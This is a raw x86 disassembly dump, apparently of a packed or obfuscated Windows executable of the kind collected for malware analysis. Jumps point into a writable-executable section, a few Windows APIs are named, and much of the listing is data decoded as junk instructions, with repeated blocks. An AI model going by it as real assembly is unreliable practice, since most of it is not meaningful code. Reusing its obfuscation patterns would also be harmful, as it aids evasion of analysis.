sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
add [ eax - 0x58 ] ch
adc al al
jle __import_name_0(KERNEL32:GetCurrentProcess)
jle rwxdata
mov esp 0x4601781d
cmp al 0x69
mov [ 0xffffffffe9ef6996 ] ch
lodsb [ si ]
cmpsd [ esi ] [ edi ]
arpl [ ebp + 0x45 ] sp
js rwxdata
jb rwxdata
bound esp [ ecx + 0x73 ]
add [ gs : esi - 0x75 ] ah
push ds
bt dx ax
bt si 0x9
bt bp 0x3
pushad
shr ebx 0xc
stc
cmp ebx 0x1
call sub_515994
add [ eax ] al
inc edi
je rwxdata
cmp ax cx
setns bl
shrd bx si 0x8
push 0x5fb38d27
mov bx [ esi ]
pushfd
and ebx 0xfff
jmp rwxdata
stc
push 0x36eb56d9
stc
cmp ebx 0x2
push 0xf84f98d
pushad
lea esp [ esp + 0x28 ]
je rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
inc edi
je rwxdata
in al dx
outsd
bswap esi
lahf
cmp al 0x0
add dl bl
int 0x58
mov edi 0x6bd472f
in al 0x62
mov dl 0x70
sti
insb
imul [ edx + 0x7c5df96f ]
mov al 0x27
mov ecx 0x319e2d58
mov eax [ 0xffffffffbc36a200 ]
sbb eax 0x3c460178
imul ecx [ eax - 0x109669d3 ] 0xa7ac67e9
push 0x9447f669
mov ebp 0xd6af0e06
pushfd
cmp [ edi ] eax
add [ ebp - 0x185c2d04 ] ecx
cmpsb [ es : esi ] [ edi ]
sar [ ebp - 0x536ddcb0 ] cl
je rwxdata
add [ ebx - 0x54f099c2 ] cl

salc
arpl [ ebp + 0x73 ] sp
jae rwxdata
test esi ebp
add [ edi + ebx ] ax
pushfd
push [ esp + 0x4 ]
push 0x7ff9b3ca
lea esp [ esp + 0x14 ]
jmp rwxdata
cmp dh dh
shr bl cl
shl bx cl
mov bx [ esi ]
pushfd
and ebx 0xfff
call sub_514f4a
add [ eax ] al
dec ebp
outsd
jne rwxdata
cmc
cmc
cmp ebx 0x3
pushad
call sub_4cd011
lea esp [ esp + 0x24 ]
jae rwxdata
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
xchg esi eax
imul ebp edi 0xa7ac67e9
jne rwxdata
push 0x7ec010a8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
mov ebx 0xafc2bff4
ror [ esi - 0x62305f19 ] cl
0x34ffda84 0x8524
[ eax + 0x2c24648d ]
xor esi [ gs : edx ]
dec esi
js rwxdata
jmp rwxdata
jmp rwxdata
jmp rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
cli
stc
dec edi
loopne rwxdata
jb rwxdata
rol bl cl
shrd ebx eax 0x16
sub eax eax
sete bl
movzx bx bl
not edi
bswap si
pop ebx
jmp rwxdata
bswap si
ror si cl
btr si bx
sbb esi esi
add edi ebx
sar esi 0x1f
mov esi [ edx ]
cmp ch dh
pushfd
test esi esi
pushad
lea esp [ esp + 0x24 ]
je rwxdata
je rwxdata
xor al 0x24
test edi edi
pushfd
pushad
lea esp [ esp + 0x2c ]
add ah al
jbe rwxdata
push 0xe54feceb
mov [ esp ] 0x9e49
lea esp [ esp + 0x4 ]
call sub_514aff
push 0x73519e81
pushad
adc al al
jmp rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jb rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
push cs
scasd [ edi ]
salc
sbb dl bh
sub al 0xd3
xchg esp eax
movsd [ edi ] [ esi ]
adc bl [ edi - 0x12 ]
pushfd
mov ebx 0x66909afa
xchg ecx eax
test al 0x38
xchg esi eax
cld
cdq
fsubr st5
outsd
dec eax
mov [ 0xffffffffd2a626e7 ] eax
mov ebp 0xac922350
outsb
je rwxdata
call sub_516af7
adc si dx
clc
stc
add esi ebx
push 0x116783e1
pushfd
lea esp [ esp + 0x8 ]
jmp rwxdata
jne rwxdata
insb
les edi [ ebx - 0x32 ]
push esi
iretd
pushad
push [ esp + 0x4 ]
mov [ esp + 0x8 ] edi
lea esp [ esp + 0x48 ]
jae rwxdata
call j_sub_5156a9
add [ eax ] al
inc edx
imul esi [ edx + eax * 2 + 0x6c ] 0xe9600074
aad 0xf8
jne rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
cmp [ edx + 0x26 ] dh
mov edi 0x68ab77ca
cli
jb rwxdata
add ah 0xd5
shld eax ebx 0x15
mov eax [ edx + 0xc ]
call sub_4ba26d
pushad
jmp rwxdata
jpe rwxdata
pushfd
stosb [ edi ]
mov [ esp ] 0x54f5
push [ esp ]
lea esp [ esp + 0x8 ]
jmp rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
pushfd
jmp rwxdata
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
lea esp [ esp + 0x24 ]
jne rwxdata
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
jmp rwxdata
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
jmp rwxdata
inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
stosb [ edi ]
pushfd
lea esp [ esp + 0x4 ]
jmp rwxdata
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
imul esi [ ebx + 0x73 ] 0x65636170
add [ 0x7f ] bh
push ecx
pushfd
call sub_4d11bc
add [ eax ] al
pop edi
popad
insb
insb
imul esi [ fs : esi ] 0x52c3980f
mov bl 0x2
push 0xe370dce6
push eax
jmp rwxdata
mov [ 0xfffffffff274f6d5 ] al
sub bh [ cs : edi ]
jle rwxdata
add [ eax ] al
add ah ah
inc ebp
xor al [ fs : ebx + 0x3f ]
add [ edx ] al
add [ eax ] al
loopne rwxdata
pushfd
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
pushfd
push [ esp + 0x4 ]
retn 0x8
jmp rwxdata
inc ebx
push edx
push esp
insb
imul ebp [ esi + 0x64 ] 0x4473776f
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
mov ah 0x5a
0xaf298232 0x972a
into
sub ebx esi
0xa7d209b5 0x53f4
jb rwxdata
add [ eax ] al
add [ edi + 0x65 ] al
pop edi
je rwxdata
out 0x42 al
in eax 0x54
test [ ebx ] eax
js rwxdata
add [ eax ] al
add [ ebx + 0x70 ] dh
jb rwxdata
inc ecx
push [ esp + 0x8 ]
pushfd
mov al 0x10
pushfd
jmp rwxdata
inc edx
sahf
imul [ ebp + 0x1d88a34f ]
nop
jo rwxdata
push cs
je rwxdata
or [ eax ] al
add [ eax ] al
in al 0x45
mov edi ebx
nop
stc
inc ebx
aas
test [ ebx ] 0x0
add [ eax + 0x38f2d8fc ] ah
pop ecx
aas
or al 0x0
add [ eax ] al
add dl ch
pop esi
stc
enter 0x5926 0x3f
or al 0x0
add [ eax ] al
inc eax
lds edi [ edx - 0x7 ]
cmp [ ebx + 0x3c3f52 ] al
add [ eax ] al
xor [ edx - 0x6 ] dl
cld
les eax [ ebx + 0x1483f52 ]
add [ eax ] al
pushad
pushf
pop [ esp + 0x1e ]
pushfd
not dl
rcl dl cl
mov dl [ esi ]
jmp rwxdata
call sub_5160c0
fdivr [ eax - 0x29 ]
pop ebp
0x2c6efc40 0xba31
int3
jbe rwxdata
lodsd [ esi ]
add eax 0x56534d00
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
mov esp 0x830d700a
and cl ch
jmp rwxdata
imul ebp [ edi + 0x6e ] r-xdata
add [ eax ] al
jo rwxdata
scasd [ edi ]
sub dl [ edi - 0x150cd632 ]
mov ch 0x9
shl [ edi + 0x482053f4 ] cl
xor eax 0xc663e665
jpo rwxdata
inc ebx
add [ ebp + 0x5 ] cl
add dh al
add al 0x24
xor eax 0x3c2444c7
xor ch [ eax + 0x51 ]
add cl ch
inc edi
pop esp
cli
dec [ ebx - 0x14 ]
inc edi
0x859c
add [ eax ] al
jo rwxdata
jae rwxdata
test ecx ecx
rcl [ 0x2b41ffdc ] cl
cmp eax 0xf8ddff8a
mov ebp 0x64e42207
0xd9ba
hlt
outsb
je rwxdata
mov [ esp + 0x4 ] ch
pushad
pop ecx
aas
or al 0x0
add [ eax ] al
shr dl 0x34
clc
pushfd
cli
push ebp
lahf
adc ecx ebx
into
pop edx
test [ edi + 0x4086c7ea ] eax
js rwxdata
not dl
mov [ esp ] 0x7
ror dl 0x2
pushfd
push 0xe79e7e8c
dec dl
bt sp bx
clc
push [ esp + 0x8 ]
ror dl 0x6
std
bt ax bx
cmc
push [ esp + 0x2e ]
popf
pushfd
mov [ esp ] 0x3f
inc esi
jmp rwxdata
mov bl 0x2
push 0xbc73fcd6
push 0xb25f2b2b
inc al
inc ecx
jmp rwxdata
je rwxdata
outsb
insb
add [ eax ] al
add [ ebx + 0x65 ] dl
je rwxdata
insb
jbe rwxdata
je rwxdata
jpe rwxdata
je rwxdata
add [ ecx ] edi
add [ esi + 0x70 ] ah
jne rwxdata
add cl dl
push edi
shr [ eax - 0x31 ] 0x40
jb rwxdata
push [ ebp - 0x8 ]
add [ eax - 0x77 ] ah
inc esp
and al 0x20
mov [ esp + 0x4 ] 0x86ae
pop eax
pushfd
outsb
inc esp
jae rwxdata
jb rwxdata
sub bh [ edi ]
rol [ ecx ] 0x15
adc dl dl
mov [ esp ] bl
pushfd
push esp
pushfd
push [ esp + 0x40 ]
retn 0x44
pushad
jmp rwxdata
jae rwxdata
arpl [ ebp + 0x43 ] sp
popad
jo rwxdata
call sub_514aff
jmp rwxdata
add al 0x51
add [ edi + 0x18 ] eax
imul esi [ 0x24648db4 ] 0x8
inc ecx
xor [ ebx - 0x50c87ee4 ] eax
sub ch cl
mov esp 0xbcaf27cd
or cl al
cdq
popfd
sbb ch bl
xchg edi eax
je rwxdata
arpl [ eax ] ax
add [ eax ] al
inc edi
je rwxdata
0xda80
je rwxdata
mov al 0x10
call sub_515d53
add [ eax ] al
jae rwxdata
outsd
pushfd
adc [ edx ] esi
xchg esi eax
imul edx ecx 0xa7c254e0
in al 0xcf
je rwxdata
xchg ecx eax
add [ ecx + ebp - 0x1 ] edi
add [ eax ] al
add [ esi + 0x66 ] ah
insb
jne rwxdata
setae [ 0xffffffffa81b6c87 ]
test [ ecx ] edi
fmul [ ecx - 0x7ed456cd ]
sahf
push ss
scasd [ edi ]
shr esp 0x1
or [ ecx + 0x3a ] esp
jo rwxdata
out dx al
adc [ eax ] eax
add [ edi - 0x77 ] dl
iretd
jb rwxdata
scasb [ edi ]
add [ ebp + 0x7c019132 ] bl
sub edi edi
add al ch
or [ ebp + 0x534d0005 ] ebp
push esi
mov al [ 0xffffffffae5c8487 ]
dec ebp
aam 0x91
hlt
aad 0x4d
lea esp [ esp + 0x38 ]
call sub_514aff
pushad
adc al al
call sub_4ba21b
add [ eax ] al
dec edi
jo rwxdata
push 0x246c8800
add al 0x60
push eax
sbb cl [ esi - 0x29 ]
sahf
cwde
shr [ ebp + 0x32 ] 0x2c
imul edx [ esi - 0x80 ] 0xffffffd7
or [ ebx ] eax
jne rwxdata
dec esp
cmp ecx [ edx + 0x20 ]
imul eax [ ecx + edx * 2 ] 0x1
inc edi
sbb [ ebx + 0x35 ] ch
mov ah 0x8d
and al 0x8
pop ds
add [ eax ] al
pushad
lea esp [ esp + 0x24 ]
jne rwxdata
jo rwxdata
call sub_515ff7
lea edi [ ecx + 0x791c83a5 ]
and al 0x4
add [ eax ] al
add [ esi + 0x69 ] dl
jb rwxdata
je rwxdata
jns rwxdata
jne rwxdata
das
sahf
add eax 0x63fb557b
cwde
and al 0xa9
sub [ ebx - 0x78b248b7 ] 0x4409
cmp eax 0x7fb6fd05
popad
add al 0x78
outsd
insb
jne rwxdata
sbb ch [ ecx ]
pslld mm7 [ esi ]
add eax 0x3776657f
test al 0x87
inc ecx
inc eax
push ss
ja rwxdata
je rwxdata
test [ edi ] ebx
insb
push eax
jb rwxdata
inc ecx
add [ ebx - 0x21 ] dl
jne rwxdata
insd
add cl ch
mov dh 0x19
add esp eax
push esi
std
jle rwxdata
add [ eax ] al
insd
push esp
imul ebp [ ebp + 0x65 ] 0x19b6e900
mov edi [ esp + 0x8 ]
call sub_5160ed
add [ eax ] al
inc edi
je rwxdata
mov ecx 0x791c83a5
je rwxdata
jb rwxdata
jbe rwxdata
cmp edi [ ecx - 0x6278c946 ]
je rwxdata
retn 0xd248
push edi
mov edi ecx
mov ebx [ esp + 0x4 ]
btc ax 0x1
aaa
mov esi edi
arpl [ eax + eax + 0x66 ] si
adc esi edx
jmp rwxdata
popad
insd
inc ecx
add [ eax + 0x72 ] ch
sbb al 0x13
ja rwxdata
dec eax
pop edi
pop edi
je rwxdata
adc eax 0x4d9c0a5a
in eax dx
std
dec eax
popad
jae rwxdata
sbb al 0xfb
adc [ eax ] eax
xor [ ecx + edx ] bl
cmc
test al 0xb
add [ ecx - 0x60 ] dh
or eax [ eax ]
sub [ ebp + 0x5caf000b ] esp
adc [ eax ] eax
test [ edi + 0x11 ] dh
add bh ch
pop esp
adc [ eax ] eax
outsb
dec esi
adc [ eax ] eax
aam 0xa6
or eax [ eax ]
mov [ ecx + edx ] ch
in al dx
push esp
adc [ eax ] eax
mov [ esi + 0x46b6000b ] fs
adc [ eax ] eax
out dx eax
mov [ 0x6304000b ] eax
adc [ eax ] eax
inc edi
mov al [ 0xffffffffa40d000b ]
or eax [ eax ]
mov eax 0x3e001164
push 0xab0e0011
or eax [ eax ]
and eax 0x5a00115e
jl Heap32ListFirst@IAT
popad
imul ebp [ esi + 0x61 ] 0x736772
push 0x1ac010d0
call sub_518ef7
cmp al 0x30
std
0xfdc0953a 0x7610
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
cli
arpl [ ecx ] dx
add [ ebp + 0x64 ] cl
adc [ eax ] eax
popad
mov al [ 0x6435000b ]
adc [ eax ] eax
cmp ebp [ esi + 0x11 ]
add [ ecx + edi * 2 + 0x560b0011 ] dh
adc [ eax ] eax
das
jge GetSystemTime@IAT
add [ ecx + 0x56 ] al
adc [ eax ] eax
pop edi
adc [ eax ] ax
and [ edx + 0x6b06000b ] 0x11
add dl bh
xor ah [ esi - 0x5a ]
int3
jae rwxdata
pop ds
dec esi
adc [ eax ] eax
mov eax [ 0x6b000ba6 ]
mov [ 0xfffffffffed3000b ] eax
or al 0x0
xlat
mov [ 0x11ee000b ] eax
or eax 0x11662600
add bh al
pop ecx
adc [ eax ] eax
adc al 0x5a
adc [ eax ] eax
lds esp [ eax + 0x11 ]
add [ ebx - 0x2affeeac ] bh
pushad
adc [ eax ] eax
dec esi
ror [ eax + eax ] 0x1
push cs
stosb [ edi ]
or eax [ eax ]
cmp [ ebx + 0x75f2000b ] ebp
adc [ eax ] eax
add al 0x7d
adc [ eax ] eax
aas
mov [ 0x7759000b ] al
adc [ eax ] eax
mov eax 0x85000ba6
into
add [ esp ] cl
adc [ eax ] eax
jg rwxdata
jbe rwxdata
jb rwxdata
add [ ecx + 0x11 ] ebx
add [ edx ] ch
dec [ eax + eax ]
add [ eax + 0x29001153 ] ah
push esp
adc [ eax ] eax
pop edx
test eax 0x5933000b
adc [ eax ] eax
js WaitForSingleObject@IAT
add [ ebp - 0x28fff332 ] al
adc [ eax ] eax
lodsd [ esi ]
movsd [ edi ] [ esi ]
or eax [ eax ]
je CreateEventA@IAT
je __import_name_6(MSVCRT:__getmainargs)
mov ecx 0x9d8736ba
push esp
add [ eax ] dl
inc ebx
or al 0x0
xlat
or eax [ eax ]
hlt
cmp [ esi + 0x11 ] edx
add cl al
adc [ 0x115c3e00 ] ecx
add [ edx - 0x2f ] al
or al 0x0
aaa
test al 0xb
add [ edx + 0x5a ] dh
adc [ eax ] eax
cmp dh [ ecx + 0x11 ]
add [ eax ] al
add [ eax ] al
add ch cl
arpl [ ecx ] dx
add [ eax + 0x76001177 ] ch
dec esp
adc [ eax ] eax
pop ecx
adc [ eax ] eax
mov [ esi + 0x11 ] gs
add [ ebx + ecx * 2 ] al
adc [ eax ] eax
jg rwxdata
xor ebx [ ecx + 0x11 ]
add [ ecx ] al
pop ecx
adc [ eax ] eax
sub bh bh
or al 0x0
adc [ eax ] eax
sub_4cd122
lea esp [ esp + 0xc ]
jae rwxdata
jmp rwxdata
stc
cmp ah 0x5
push edi
call sub_4d124a
add [ eax ] al
ja rwxdata
mov bl 0x4a
setb bl
mov bl al
inc ecx
push esi
dec bl
pushfd
inc ecx
add esp 0x8
not bl
test dh 0x55
xchg ebp eax
daa
clc
mov eax ebp
pushad
add bl ah
mov bl 0x1
sub esp 0xffffffe0
mov cl 0x7b
jo rwxdata
cmp di 0xba02
cmp si sp
push esi
ror si cl
pushad
mov esi edi
call sub_51578e
add [ eax ] al
dec esi
je rwxdata
push 0xf9efd1ed
mov [ esp ] bp
pushad
mov [ esp + 0x20 ] esi
shr esi cl
lea esi [ eax * 2 - 0x2888c866 ]
mov esi edi
push [ esp ]
call sub_515aa3
jpo rwxdata
imul ebp [ esi + 0x74 ] 0x4166
add [ edi + 0x65 ] al
je rwxdata
mov ebx [ esi ]
bt esp 0x10
clc
stc
clc
and ebx 0xfff
cmp ah 0x4e
pushfd
stc
clc
add [ edi + ebx ] edx
sub esp 0xfffffff8
cmp dh ah
bt ax ax
add esi 0x2
jmp rwxdata
imul ebp [ edi + 0x73 ] 0x5ce06100
cmc
fidiv [ ebp - 0x3914778 ]
pop esp
stc
ffree st5
adc eax 0x697f9b59
insd
xor al 0xf7
retn 0xf8d7
jns rwxdata
pushad
jmp rwxdata
inc ecx
and esi ebp
je rwxdata
and al 0x45
shl [ edi - 0x64 ] 0x3c
bound edi [ eax + edx * 4 + 0xe ]
out dx eax
xchg [ esi ] ch
lea ecx [ edx ]
mov eax [ 0xffffffffff43e6e3 ]
mov esp 0x4ece65cb
shl [ edx - 0xd ] cl
jb rwxdata
js rwxdata
je rwxdata
pushfd
dec ecx
call sub_4baa7e
add [ eax ] al
pop edi
popad
jne rwxdata

test al 0xf7
scasb [ edi ]
retn 0xc088
sti
cld
xor ebp [ ecx ]
sbb eax [ edx ]
cli
jno rwxdata
fwait
xchg ebp eax
cmc
in al dx
xor ebx edi
cmp eax 0xfe036f70
or [ eax - 0x38 ] edi
insd
inc esp
imul esi [ edx + 0x65 ] 0x726f7463
jns rwxdata
sub bl [ edx ]
lea ecx [ ebx - 0x74fd2acb ]
rcr [ cs : ebx + 0x1a ] cl
pop eax
rwxdata
insb
jae rwxdata
hlt
jpo rwxdata
and ebx ebp
mov ch 0x34
test edx 0xbf01f8d7
xchg ebx eax
retn
add [ eax ] al
add [ edx + 0x61 ] dh
imul esi [ ebx + 0x65 ] 0x5f000000
insd
bound esi [ ebx + 0x63 ]
insd
jo rwxdata
arpl [ ebp + 0x70 ] bp
add [ eax ] al
add [ ebx + 0x74 ] dh
jb rwxdata
js rwxdata
jb rwxdata
push ebx
dec ecx
cmp esp [ ebx ]
pop edi
rcl [ ebx + 0x49 ] 0x1
push esp
xchg edi edx
shr [ esi + esi * 4 - 0x8 ] cl
and al 0x40
je rwxdata
lahf
retn
inc ebx
or cl [ ebx - 0x52 ]
call sub_5149a7
push 0x2ac01081
call sub_518563
outsd
jb rwxdata
inc ebx
pop edi
xchg ebp eax
jb rwxdata
jmp rwxdata
and al 0x40
add [ eax - 0x2 ] ah
enter 0x9f0f 0xc3
pushad
ror bl cl
mov [ esp + 0x8 ] 0x24
ror al 0x6
pushfd
push 0x3db5ced4
stosb [ edi ]
mov bl ch
mov bl 0x2
lea esp [ esp + 0x4c ]
pushad
pushfd
lea esp [ esp + 0x24 ]
call sub_514aff
pushfd
push [ esp ]
lea esp [ esp + 0x8 ]
jae rwxdata
mov [ 0xfffffffff31bb787 ] al
and ah bl
retn 0x9b5f
out dx eax
inc ecx
inc ecx
pop ss
push es
cmp esp ebp
stc
movsb [ edi ] [ esi ]
jg rwxdata
mov edi 0xf7fca70b
mov ebp 0xcbf4976e
adc al ah
mov al ch
mov al cl
lodsb [ esi ]
not bl
cmc
not al
jmp rwxdata
pushfd
pushfd
stc
sub ecx ecx
jmp rwxdata
adc esi [ ecx + ebx * 8 + 0xf7bb13b ]
jecxz rwxdata
ror al 0x2
call sub_515d7b
add [ eax ] al
pop edi
imul ebp [ edi + 0x62 ] 0x7ae96000
lea esp [ esp + 0x8 ]
iretd
je rwxdata
pushad
lea esp [ esp + 0x20 ]
jae rwxdata
xchg ebx eax
jo rwxdata
shr [ ebx + 0x73b5dc9b ] 0x1
out 0x8b eax
jecxz rwxdata
pushad
lea esp [ esp + 0x20 ]
call sub_516816
push 0x2f36ccdf
push ebx
sub ecx ebx
push [ esp ]
call sub_514f1a
add [ eax ] al
push esi
imul esi [ edx + 0x74 ] 0x466c6175
jb rwxdata
call sub_4ba562
pushfd
call sub_514bca
add [ eax ] al
push edx
jo rwxdata
jpo rwxdata
mov [ 0x756e1dbb ] eax
js rwxdata
mov esp [ ebx - 0x4 ]
cmp ebx [ edi ]
call 0x78500b12
push cs
stc
movsd [ edi ] [ esi ]
dec edx
xchg ebx eax
cli
xchg ebx eax
mov eax ecx
[ ebx - 0x61 ] dh
add [ eax ] al
add al al
add [ edx + esi * 8 + 0x14 ] esp
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
scasb [ edi ]
mov cl dh
loopne rwxdata
inc ebp
js rwxdata
add al 0xae
jb rwxdata
jae rwxdata
mov bh 0x9e
jg rwxdata
test [ edx - 0x16ed8316 ] ebx
jae rwxdata
xor bh [ ebx + 0x359af79a ]
or al 0x6a
stosb [ edi ]
sub al 0x4
add [ eax ] al
loopne rwxdata
pop ecx
aas
or al 0x0
add [ eax ] al
add dh al
or esi ebx
adc [ fs : edx + 0x3f ] 0x58
add [ eax ] eax
add [ eax + 0xc ] dl
mov edi edx
sub al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
add [ edi + 0x2264fcdc ] ah
pop ecx
aas
clc
push eax
push [ esp + 0x4 ]
xchg [ esp + 0x8 ] ebp
sub bp dx
shl ebp cl
lea ebp [ esp + 0x8 ]
stc
push [ esp ]
bt esi 0x2
cmp esp ecx
mov [ esp + 0x8 ] ecx
mov [ esp + 0x4 ] 0x6b
mov [ esp + 0x4 ] ebx
cmc
bt dx 0x1
or eax eax
call sub_4d126d
lodsb [ esi ]
pushfd
not al
clc
jmp rwxdata
lea eax [ 0x0 ]
mov [ esp ] 0x35
mov [ esp + 0x3c ] rwxdata
jmp rwxdata
pop [ esp + 0x1c ]
pushad
push [ esp ]
jmp rwxdata
clc
inc ebp
jbe rwxdata
aas
and [ esi + 0x30 ] esi
lds ebp [ ebx ]
shl [ edi - 0x90a8062 ] cl
je rwxdata
neg [ ebx - 0x44cd108e ]
0xc359af7 0xaa6a
pop ecx
fwait
jg rwxdata
popfd
or bl 0xaa
xchg ebp eax
add al 0x25
pop edi
mov ah 0xd3
out 0xee eax
adc esi [ eax - 0x6 ]

inc ebx
aas
out 0x0 eax
add [ eax ] al
jmp rwxdata
salc
clc
hlt
cmc
mov [ esp ] 0x4a54
ror al 0x2
mov [ esp + 0x4 ] bh
dec al
jmp rwxdata
push 0x21193420
call sub_4ba009
add [ eax ] al
inc ebx
jb rwxdata
xchg [ eax - 0x64 ] bl
and [ esi - 0x39 ] ah
inc esp
and al 0x4
scasb [ edi ]
outsb
je rwxdata
fwait
jb rwxdata
adc eax [ ecx + 0x7d ]
add eax 0xef38ff97
jbe rwxdata
cmc
cmc
stc
ror al 0x6
lea esp [ esp + 0x2c ]
jne rwxdata
add [ ebx - 0x5afb46d0 ] ch
jo rwxdata
cdq
xlat
movsb [ edi ] [ esi ]
neg [ ecx - 0x279cc9c7 ]
add [ eax ] al
ja rwxdata
add al ch
out dx al
mov dl 0xfb
jmp [ esi - 0x39 ]
add [ eax ] cl
xor eax 0x7d9bf9ac
lodsd [ esi ]
shl al 0x7c
in al dx
je rwxdata
pop esi
aas
or [ esp + eax ] 0x7
dec ebx
out 0xf2 eax
mov bl 0xf3
inc ebx
aas
cmp eax 0x90000008
pop ss
sub al 0xf1
loopne rwxdata
call sub_4cfe42
mov [ esp ] 0x4e50
add dl dl
lea esp [ esp + 0x4 ]
js rwxdata
call j_sub_51680a
pushfd
mov [ esp ] 0xc4ad
cmp eax 0x7d00
pushfd
pushad
lea esp [ esp + 0x28 ]
jae rwxdata
jmp rwxdata
outsb
inc esp
arpl [ gs : edx + 0x79 ] si
jo rwxdata
je rwxdata
jae rwxdata
mov es sp
pop ss
add eax 0x830ad99d
xchg edi eax
cwde
mov al 0x26
pop ecx
aas
or al 0x0
add [ eax ] al
inc eax
inc ecx
idiv ch
leave
inc ebx
aas
jmp rwxdata
pushfd
push [ esp ]
push 0x42e22958
lea esp [ esp + 0xc ]
jne rwxdata
stc
pushfd
call sub_4cd0f5
sub [ ebp - 0x282051e4 ] bh
in al dx
xchg edx eax
stosd [ edi ]
xor [ ecx + 0x32f1a504 ] bh
int1
xor ah [ eax - 0x51a37b79 ]
add al 0xa5
add [ eax ] al
add [ edi + 0x65 ] al
je rwxdata
je rwxdata
popad
jo rwxdata
je rwxdata
xor al 0xfd
movsd [ edi ] [ esi ]
dec esi
push edi
div [ 0x69d36210 ]
fsubr [ ebp - 0x5809edc ]
mov ecx 0xa2c3bbf9
enter 0x5d3f 0x2f
test edx 0xeb93f012
mov ch 0x27
push 0xffffffda
add [ eax ] al
